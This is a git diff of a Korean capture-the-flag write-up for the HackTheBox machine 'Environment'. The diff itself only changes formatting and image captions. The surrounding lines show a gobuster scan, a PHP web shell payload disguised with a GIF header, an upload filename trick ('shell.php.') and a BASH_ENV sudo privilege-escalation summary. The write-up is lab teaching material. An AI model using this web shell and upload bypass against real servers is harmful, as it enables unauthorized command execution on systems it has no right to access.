@@ -1,4 +1,3 @@
-```markdown
 # Environment
 
 ## Overview
@@ -55,8 +54,8 @@ gobuster dir -u http://environment.htb \
   -x php,html
 ```
 
-![gobuster result](images/gobuster-results-1.png)
-![gobuster result](images/gobuster-results-2.png)
+![gobuster result 1](images/gobuster-results-1.png)
+![gobuster result 2](images/gobuster-results-2.png)
 
 | 경로 | 상태 코드 | 비고 |
 |------|-----------|------|
@@ -118,6 +117,8 @@ printf 'GIF89a<?php system($_GET["cmd"]); ?>' > /tmp/shell.php
 정상 이미지 업로드 요청을 Burp Suite로 인터셉트하여 Repeater로 전송한 뒤 파일 내용과 파일명, Content-Type을 수정한다.
 
 ![burp intercept upload](images/burp-intercept-upload.png)
+
+수정한 요청의 핵심 부분은 다음과 같다.
 
 ```
 Content-Disposition: form-data; name="upload"; filename="shell.php."
@@ -320,4 +321,3 @@ BASH_ENV 취약점은 sudo의 `env_reset` 옵션이 기본적으로 환경변수
 | 수평 이동 | 복호화된 크리덴셜로 SSH 접속 | ssh |
 | 권한 상승 | BASH_ENV + sudo systeminfo | nc, bash |
 | 플래그 획득 | root 쉘에서 파일 읽기 | cat |
-```
